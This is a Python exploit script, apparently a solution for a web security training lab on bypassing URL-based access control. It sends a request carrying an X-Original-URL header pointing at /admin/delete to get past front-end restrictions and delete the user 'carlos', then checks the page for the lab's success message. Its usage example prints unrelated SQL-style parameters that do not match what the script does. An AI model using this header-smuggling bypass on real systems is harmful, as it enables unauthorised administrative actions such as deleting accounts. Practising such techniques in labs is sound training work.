# Lab 5: URL-based access control can be circumvented

import sys

import requests
import urllib3
from colorama import Fore

urllib3.disable_warnings()

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


def delete_user():
    delete_carlos_url = url + "?username=carlos"
    headers = {"X-Original-URL": "/admin/delete"}
    r = s.get(
        delete_carlos_url, headers=headers, verify=False, proxies=proxies, timeout=5
    )

    # check if the user was deleted
    r = s.get(url, verify=False, proxies=proxies, timeout=5)
    r.raise_for_status()
    res = r.text
    if "Congratulations, you solved the lab!" in res:
        print(f"{Fore.GREEN}[-] Carlos deleted{Fore.RESET}")
        return
    print(f"{Fore.RED}[-] Carlos not deleted{Fore.RESET}")


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()

    except IndexError:
        print(f"{Fore.RED}[-] Usage: {sys.argv[0]} <url>{Fore.RESET}")
        print(
            f'[-] Example: {sys.argv[0]} USER_NAME = "administrator" TABLE_NAME = "users" COLUMN_NAME = "username""'
        )
        sys.exit(-1)

    print("[*] Exploiting...")
    s = requests.Session()
    delete_user()
